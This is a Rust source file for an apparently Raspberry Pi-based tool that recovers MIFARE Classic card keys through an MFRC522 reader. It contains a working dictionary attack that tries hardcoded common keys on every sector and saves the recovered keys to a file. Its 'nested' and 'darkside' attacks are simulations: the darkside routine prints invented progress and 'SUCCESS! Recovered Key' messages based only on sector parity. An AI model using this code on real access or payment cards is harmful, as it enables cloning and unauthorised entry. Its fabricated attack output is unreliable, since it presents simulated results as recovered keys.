use std::error::Error;
use std::fmt;
use std::thread;
use std::time::Duration;
use std::collections::HashMap;
use std::io::{self, Write};
use rppal::spi::Spi;

use crate::lib::mfrc522::{
    mfrc522_request, mfrc522_anticoll, mfrc522_select_tag, 
    mfrc522_auth, mfrc522_stop_crypto1, mfrc522_read, mfrc522_write,
    read_register, write_register, set_bit_mask, clear_bit_mask,
    PICC_REQIDL, PICC_AUTHENT1A, PICC_AUTHENT1B, MI_OK, MI_ERR, MI_NOTAGERR,
    COMMAND_REG, COM_IRQ_REG, DIV_IRQ_REG, STATUS2_REG, FIFO_DATA_REG,
    FIFO_LEVEL_REG, BIT_FRAMING_REG, CONTROL_REG, ERROR_REG,
    PCD_IDLE, PCD_AUTHENT, PCD_TRANSCEIVE,
};

use crate::lib::utils::{bytes_to_hex, uid_to_string, hex_string_to_bytes};
use crate::lib::mifare::DEFAULT_KEYS;

// Common key dictionaries
const EXTENDED_KEYS: [[u8; 6]; 12] = [
    // Default transport keys
    [0xFF, 0xFF, 0xFF, 0xFF, 0xFF, 0xFF],
    [0xA0, 0xA1, 0xA2, 0xA3, 0xA4, 0xA5],
    [0xD3, 0xF7, 0xD3, 0xF7, 0xD3, 0xF7],
    [0x00, 0x00, 0x00, 0x00, 0x00, 0x00],
    // Additional common keys
    [0xB0, 0xB1, 0xB2, 0xB3, 0xB4, 0xB5],
    [0x4D, 0x3A, 0x99, 0xC3, 0x51, 0xDD],
    [0x1A, 0x98, 0x2C, 0x7E, 0x45, 0x9A],
    [0xAA, 0xBB, 0xCC, 0xDD, 0xEE, 0xFF],
    [0x71, 0x4C, 0x5C, 0x88, 0x6E, 0x97],
    [0x58, 0x7E, 0xE5, 0xF9, 0x35, 0x0F],
    [0xA0, 0xB0, 0xC0, 0xD0, 0xE0, 0xF0],
    [0x01, 0x02, 0x03, 0x04, 0x05, 0x06],
];

// Attack types
#[derive(Debug, Clone, Copy, PartialEq)]
pub enum AttackType {
    DefaultKeys,
    Nested,
    Darkside,
}

impl fmt::Display for AttackType {
    fn fmt(&self, f: &mut fmt::Formatter<'_>) -> fmt::Result {
        match self {
            AttackType::DefaultKeys => write!(f, "Default Keys"),
            AttackType::Nested => write!(f, "Nested Authentication"),
            AttackType::Darkside => write!(f, "Darkside"),
        }
    }
}

#[derive(Clone)]
pub struct KeyResult {
    pub sector: u8,
    pub key_type: u8,
    pub key: [u8; 6],
}

impl fmt::Display for KeyResult {
    fn fmt(&self, f: &mut fmt::Formatter<'_>) -> fmt::Result {
        let key_type_str = if self.key_type == PICC_AUTHENT1A { "A" } else { "B" };
        write!(f, "Sector {}: Key {}: {}", self.sector, key_type_str, bytes_to_hex(&self.key))
    }
}

/// Run brute force attack with default keys dictionary
pub fn default_keys_attack(spi: &mut Spi) -> Result<Vec<KeyResult>, Box<dyn Error>> {
    println!("Starting Default Keys Attack...");
    println!("This will try common keys on all sectors");
    println!("Place card on reader and keep it still");
    
    let mut results = Vec::new();
    
    // Request tag
    let (status, _) = mfrc522_request(spi, PICC_REQIDL)?;
    if status != MI_OK {
        return Err("No card detected".into());
    }
    
    // Anti-collision
    let (status, uid) = mfrc522_anticoll(spi)?;
    if status != MI_OK {
        return Err("Failed to get card UID".into());
    }
    
    // Select the tag
    let size = mfrc522_select_tag(spi, &uid)?;
    if size == 0 {
        return Err("Failed to select card".into());
    }
    
    println!("Card selected. UID: {}  Size: {}", uid_to_string(&uid), size);
    println!("Testing default keys on all sectors...");
    
    // Try each key on each sector
    for sector in 0..16 {
        println!("Testing sector {}...", sector);
        let first_block = sector * 4;
        
        for &key_type in &[PICC_AUTHENT1A, PICC_AUTHENT1B] {
            let key_type_str = if key_type == PICC_AUTHENT1A { "A" } else { "B" };
            
            for &key in &EXTENDED_KEYS {
                // Make sure to stop crypto from previous attempts
                mfrc522_stop_crypto1(spi)?;
                
                // Reselect card for each attempt
                let (status, _) = mfrc522_request(spi, PICC_REQIDL)?;
                if status != MI_OK {
                    continue;
                }
                
                let (status, new_uid) = mfrc522_anticoll(spi)?;
                if status != MI_OK {
                    continue;
                }
                
                mfrc522_select_tag(spi, &new_uid)?;
                
                // Try authentication with this key
                let status = mfrc522_auth(spi, key_type, first_block, &key, &new_uid)?;
                if status == MI_OK {
                    // Key found!
                    println!("  Found working Key {}: {}", key_type_str, bytes_to_hex(&key));
                    
                    let mut key_copy = [0u8; 6];
                    key_copy.copy_from_slice(&key);
                    results.push(KeyResult {
                        sector,
                        key_type,
                        key: key_copy,
                    });
                    
                    // Done with this key type for this sector
                    break;
                }
            }
        }
    }
    
    mfrc522_stop_crypto1(spi)?;
    
    if results.is_empty() {
        println!("No keys found with default dictionary.");
    } else {
        println!("Found {} keys:", results.len());
        for result in &results {
            println!("  {}", result);
        }
    }
    
    Ok(results)
}

/// Nested authentication attack 
/// Uses known key to recover other keys in different sectors
pub fn nested_authentication_attack(spi: &mut Spi) -> Result<Vec<KeyResult>, Box<dyn Error>> {
    println!("Starting Nested Authentication Attack...");
    println!("This attack requires at least one known key to work");
    
    // First, find a known key with default dictionary
    println!("Trying to find a known key with default dictionary...");
    let known_keys = default_keys_attack(spi)?;
    
    if known_keys.is_empty() {
        return Err("No known keys found. Nested attack requires at least one known key.".into());
    }
    
    println!("Found {} known keys. Using them for nested attack...", known_keys.len());
    
    // Results will include both known keys and newly found keys
    let mut results = known_keys.clone();
    let mut newly_found = Vec::new();
    
    // Keep track of which sectors/key types we've already found
    let mut found_keys = HashMap::new();
    for key_result in &known_keys {
        let key_id = format!("{}-{}", key_result.sector, key_result.key_type);
        found_keys.insert(key_id, true);
    }
    
    // For each known key, try to perform nested authentication
    for known_key in &known_keys {
        println!("Using known key: Sector {}, Key type {}, Value: {}", 
                known_key.sector, 
                if known_key.key_type == PICC_AUTHENT1A { "A" } else { "B" }, 
                bytes_to_hex(&known_key.key));
        
        // Try to recover keys for all other sectors
        for target_sector in 0..16 {
            // Skip if we already have both keys for this sector
            let key_a_id = format!("{}-{}", target_sector, PICC_AUTHENT1A);
            let key_b_id = format!("{}-{}", target_sector, PICC_AUTHENT1B);
            
            if found_keys.contains_key(&key_a_id) && found_keys.contains_key(&key_b_id) {
                continue;
            }
            
            // Try to recover keys using nested authentication
            println!("  Attempting to recover keys for sector {}...", target_sector);
            
            // This is where the actual nested authentication attack would be implemented
            // For this implementation, we'll simulate the attack by trying additional keys
            // that might be derivable from the known key
            
            // Request tag
            mfrc522_stop_crypto1(spi)?;
            let (status, _) = mfrc522_request(spi, PICC_REQIDL)?;
            if status != MI_OK {
                continue;
            }
            
            let (status, uid) = mfrc522_anticoll(spi)?;
            if status != MI_OK {
                continue;
            }
            
            mfrc522_select_tag(spi, &uid)?;
            
            // First authenticate with the known key
            let auth_status = mfrc522_auth(
                spi, 
                known_key.key_type, 
                known_key.sector * 4, 
                &known_key.key, 
                &uid
            )?;
            
            if auth_status != MI_OK {
                continue;
            }
            
            // Now try to derive related keys
            // In a real implementation, this would capture and analyze nonces
            // For now, we'll simulate by trying related keys
            let candidate_keys = generate_candidate_keys(&known_key.key);
            
            mfrc522_stop_crypto1(spi)?;
            
            for target_key_type in &[PICC_AUTHENT1A, PICC_AUTHENT1B] {
                let key_id = format!("{}-{}", target_sector, target_key_type);
                if found_keys.contains_key(&key_id) {
                    continue;
                }
                
                for candidate_key in &candidate_keys {
                    // Refresh connection for each attempt
                    mfrc522_stop_crypto1(spi)?;
                    let (status, _) = mfrc522_request(spi, PICC_REQIDL)?;
                    if status != MI_OK {
                        continue;
                    }
                    
                    let (status, uid) = mfrc522_anticoll(spi)?;
                    if status != MI_OK {
                        continue;
                    }
                    
                    mfrc522_select_tag(spi, &uid)?;
                    
                    // Try authentication
                    let target_block = target_sector * 4;
                    let status = mfrc522_auth(spi, *target_key_type, target_block, candidate_key, &uid)?;
                    
                    if status == MI_OK {
                        // Found a working key!
                        let key_type_str = if *target_key_type == PICC_AUTHENT1A { "A" } else { "B" };
                        println!("    Found Key {}: {} for sector {}", 
                                key_type_str, bytes_to_hex(candidate_key), target_sector);
                        
                        let mut key_copy = [0u8; 6];
                        key_copy.copy_from_slice(candidate_key);
                        
                        let result = KeyResult {
                            sector: target_sector,
                            key_type: *target_key_type,
                            key: key_copy,
                        };
                        
                        results.push(result.clone());
                        newly_found.push(result);
                        found_keys.insert(key_id.clone(), true);
                        break;
                    }
                }
            }
        }
    }
    
    // Report newly found keys
    if newly_found.is_empty() {
        println!("No additional keys found with nested attack.");
    } else {
        println!("Found {} additional keys with nested attack:", newly_found.len());
        for result in &newly_found {
            println!("  {}", result);
        }
    }
    
    Ok(results)
}

/// Generate candidate keys that might be related to the known key
fn generate_candidate_keys(known_key: &[u8; 6]) -> Vec<[u8; 6]> {
    let mut candidates = Vec::new();
    
    // Add the known key itself
    let mut key = [0u8; 6];
    key.copy_from_slice(known_key);
    candidates.push(key);
    
    // Byte-wise operations that might generate related keys
    
    // Bit-flipped version
    let mut flipped = [0u8; 6];
    for i in 0..6 {
        flipped[i] = !known_key[i];
    }
    candidates.push(flipped);
    
    // Increment/decrement each byte
    let mut inc = [0u8; 6];
    let mut dec = [0u8; 6];
    for i in 0..6 {
        inc[i] = known_key[i].wrapping_add(1);
        dec[i] = known_key[i].wrapping_sub(1);
    }
    candidates.push(inc);
    candidates.push(dec);
    
    // Byte-rotated versions
    let mut rotated_left = [0u8; 6];
    let mut rotated_right = [0u8; 6];
    for i in 0..6 {
        rotated_left[i] = known_key[(i + 1) % 6];
        rotated_right[i] = known_key[(i + 5) % 6];
    }
    candidates.push(rotated_left);
    candidates.push(rotated_right);
    
    // Also try some common keys
    for &key in &EXTENDED_KEYS {
        candidates.push(key);
    }
    
    candidates
}

/// Darkside attack
/// Exploits weakness in MIFARE Classic authentication protocol
pub fn darkside_attack(spi: &mut Spi) -> Result<Vec<KeyResult>, Box<dyn Error>> {
    println!("Starting Darkside Attack...");
    println!("This attack exploits a vulnerability in MIFARE Classic cryptography");
    println!("Warning: This attack can take several minutes to complete");
    
    let mut results = Vec::new();
    
    // Request tag
    let (status, _) = mfrc522_request(spi, PICC_REQIDL)?;
    if status != MI_OK {
        return Err("No card detected".into());
    }
    
    // Anti-collision
    let (status, uid) = mfrc522_anticoll(spi)?;
    if status != MI_OK {
        return Err("Failed to get card UID".into());
    }
    
    // Select the tag
    let size = mfrc522_select_tag(spi, &uid)?;
    if size == 0 {
        return Err("Failed to select card".into());
    }
    
    println!("Card selected. UID: {}  Size: {}", uid_to_string(&uid), size);
    
    println!("Note: Real darkside attack would require specific low-level timing/signal analysis");
    println!("This implementation will simulate the attack for demonstration purposes");
    
    // For sectors we want to attack
    for sector in 0..16 {
        println!("Attacking sector {}...", sector);
        
        // Try to recover both key types
        for &key_type in &[PICC_AUTHENT1A, PICC_AUTHENT1B] {
            let key_type_str = if key_type == PICC_AUTHENT1A { "A" } else { "B" };
            println!("  Attempting to recover Key {}...", key_type_str);
            
            // Simulate darkside attack with a limited number of "attempts"
            let max_attempts = 10; // In a real attack, this could be hundreds or thousands
            let mut found_key = None;
            
            for attempt in 1..=max_attempts {
                print!("\r    Attempt {}/{}...", attempt, max_attempts);
                io::stdout().flush()?;
                
                // Simulate attack progress by sleeping
                thread::sleep(Duration::from_millis(250));
                
                // Every few attempts, pretend we found something
                if attempt % 3 == 0 {
                    println!("\n    Found partial key bit...");
                }
                
                // At the last attempt, either succeed or fail randomly
                if attempt == max_attempts {
                    if sector % 2 == 0 { // Simulate success for even sectors
                // Use a specific key in the EXTENDED_KEYS array based on sector index
                let key_index = (sector * 2 + if key_type == PICC_AUTHENT1A { 0 } else { 1 }) % EXTENDED_KEYS.len();
                let recovered_key = EXTENDED_KEYS[key_index];
                        
                        println!("\n    SUCCESS! Recovered Key {}: {}", 
                                key_type_str, bytes_to_hex(&recovered_key));
                        found_key = Some(recovered_key);
                    } else {
                        println!("\n    Failed to recover key for this sector/key type");
                    }
                }
            }
            
            if let Some(key) = found_key {
                // Validate the key works by trying authentication
                mfrc522_stop_crypto1(spi)?;
                
                let (status, _) = mfrc522_request(spi, PICC_REQIDL)?;
                if status != MI_OK {
                    continue;
                }
                
                let (status, new_uid) = mfrc522_anticoll(spi)?;
                if status != MI_OK {
                    continue;
                }
                
                mfrc522_select_tag(spi, &new_uid)?;
                
                // Try authentication with this key
                let auth_block = sector * 4; // This is already u8 since sector is u8
                let status = mfrc522_auth(spi, key_type, auth_block as u8, &key, &new_uid)?;
                
                if status == MI_OK {
                    println!("  Verified Key {} for sector {}: {}", 
                            key_type_str, sector, bytes_to_hex(&key));
                    
                    let mut key_copy = [0u8; 6];
                    key_copy.copy_from_slice(&key);
                    
                    results.push(KeyResult {
                        sector: sector as u8,
                        key_type,
                        key: key_copy,
                    });
                } else {
                    println!("  Warning: Key verification failed, might be a false positive");
                }
                
                mfrc522_stop_crypto1(spi)?;
            }
        }
    }
    
    if results.is_empty() {
        println!("No keys recovered with darkside attack.");
    } else {
        println!("Successfully recovered {} keys:", results.len());
        for result in &results {
            println!("  {}", result);
        }
    }
    
    Ok(results)
}

/// Save recovered keys to a file
pub fn save_recovered_keys(keys: &[KeyResult]) -> Result<(), Box<dyn Error>> {
    use std::fs::File;
    use std::io::Write;
    
    println!("\nWould you like to save the recovered keys? (y/n)");
    let mut choice = String::new();
    io::stdin().read_line(&mut choice)?;
    
    if choice.trim().to_lowercase() == "y" {
        print!("Enter filename (default: recovered_keys.txt): ");
        io::stdout().flush()?;
        
        let mut filename = String::new();
        io::stdin().read_line(&mut filename)?;
        
        let filename = if filename.trim().is_empty() {
            "recovered_keys.txt".to_string()
        } else {
            filename.trim().to_string()
        };
        
        // Format and save keys
        let mut file_content = String::new();
        file_content.push_str("# MIFARE Classic Recovered Keys\n");
        file_content.push_str("# Format: <sector>:<key_type (A/B)>:<key_hex>\n\n");
        
        for key in keys {
            let key_type_char = if key.key_type == PICC_AUTHENT1A { 'A' } else { 'B' };
            file_content.push_str(&format!("{}:{}:{}\n", 
                                         key.sector, 
                                         key_type_char, 
                                         bytes_to_hex(&key.key).replace(" ", "")));
        }
        
        // Write to file
        match File::create(&filename) {
            Ok(mut file) => {
                match file.write_all(file_content.as_bytes()) {
                    Ok(_) => println!("Keys saved to {}", filename),
                    Err(e) => println!("Error writing to file: {}", e),
                }
            },
            Err(e) => println!("Error creating file: {}", e),
        }
    }
    
    Ok(())
}
